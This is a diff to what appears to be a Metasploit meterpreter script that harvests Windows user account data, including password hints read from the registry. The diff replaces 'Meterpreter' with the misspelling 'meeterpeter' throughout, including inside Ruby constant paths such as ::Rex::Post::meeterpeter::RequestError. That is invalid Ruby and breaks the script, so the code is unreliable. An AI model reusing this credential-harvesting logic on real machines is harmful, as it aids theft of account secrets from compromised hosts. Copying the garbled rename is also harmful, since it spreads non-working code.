@@ -1,5 +1,5 @@
 ##
-# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# WARNING: Metasploit no longer maintains or accepts meeterpeter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
@@ -110,7 +110,7 @@ def capture_user_keys
     #Attempt to get Hints (from Win7/Win8 Location)
     begin
       users[usr.to_i(16)][:UserPasswordHint] = decode_windows_hint(uk.query_value("UserPasswordHint").data.unpack("H*")[0])
-    rescue ::Rex::Post::Meterpreter::RequestError
+    rescue ::Rex::Post::meeterpeter::RequestError
       users[usr.to_i(16)][:UserPasswordHint] = nil
     end
 
@@ -131,7 +131,7 @@ def capture_user_keys
       begin
         uk_hint = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
         users[rid][:UserPasswordHint] = uk_hint.query_value("").data
-      rescue ::Rex::Post::Meterpreter::RequestError
+      rescue ::Rex::Post::meeterpeter::RequestError
         users[rid][:UserPasswordHint] = nil
       end
     end
@@ -294,13 +294,13 @@ if client.platform =~ /win32|win64/
 
   rescue ::Interrupt
     raise $!
-  rescue ::Rex::Post::Meterpreter::RequestError => e
-    print_error("Meterpreter Exception: #{e.class} #{e}")
+  rescue ::Rex::Post::meeterpeter::RequestError => e
+    print_error("meeterpeter Exception: #{e.class} #{e}")
     print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")
   rescue ::Exception => e
     print_error("Error: #{e.class} #{e} #{e.backtrace}")
   end
 else
-  print_error("This version of Meterpreter is not supported with this Script!")
+  print_error("This version of meeterpeter is not supported with this Script!")
   raise Rex::Script::Completed
 end
